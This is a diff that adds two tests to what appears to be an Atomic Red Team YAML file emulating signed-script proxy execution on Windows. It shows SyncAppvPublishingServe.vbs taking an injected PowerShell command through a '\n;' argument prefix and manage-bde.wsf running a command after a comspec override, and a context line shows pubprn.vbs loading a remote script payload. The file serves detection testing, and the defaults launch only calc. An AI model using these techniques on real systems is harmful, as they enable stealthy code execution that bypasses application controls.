@@ -21,3 +21,45 @@ atomic_tests:
     elevation_required: false
     command: |
       cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
+
+- name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+  description: |
+    Executes the signed SyncAppvPublishingServe script with options to execute an arbitrary PowerShell command.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    command_to_execute:
+      description: A PowerShell command to execute.
+      type: string
+      default: Start-Process calc
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+- name: manage-bde.wsf Signed Script Command Execution
+  description: |
+    Executes the signed manage-bde.wsf script with options to execute an arbitrary command.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    command_to_execute:
+      description: A command to execute.
+      type: Path
+      default: C:\Windows\System32\calc.exe
+
+  executor:
+    name: command_prompt
+    elevation_required: false
+    prereq_command: | # for the "command_prompt" executor, if any command returns a non-zero exit code, the pre-requisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success. You can remove the prereq_command section if there are no pre-req's
+    command: | # these are the actaul attack commands, at least one command must be provided
+      set comspec=#{command_to_execute}
+      cscript manage-bde.wsf
+    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      set comspec=C:\Windows\System32\cmd.exe
